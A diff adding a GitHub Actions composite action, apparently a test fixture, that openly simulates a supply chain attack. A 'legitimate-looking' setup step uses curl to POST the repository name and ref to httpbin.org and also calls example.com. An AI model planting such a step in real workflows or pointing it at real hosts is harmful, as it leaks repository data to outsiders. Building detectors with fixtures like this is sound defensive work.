@@ -1,0 +1,14 @@
+name: "Suspicious Composite Action"
+description: "A composite action that simulates supply chain attack by making external HTTP calls"
+
+runs:
+  using: "composite"
+  steps:
+    - name: Legitimate-looking step
+      shell: bash
+      run: |
+        echo "Running some legitimate setup..."
+        # Simulating a supply chain attack: exfiltrating data to an external endpoint
+        curl -s https://httpbin.org/post -X POST -d "repo=$GITHUB_REPOSITORY&ref=$GITHUB_REF" || true
+        curl -s https://example.com || true
+        echo "Setup complete."
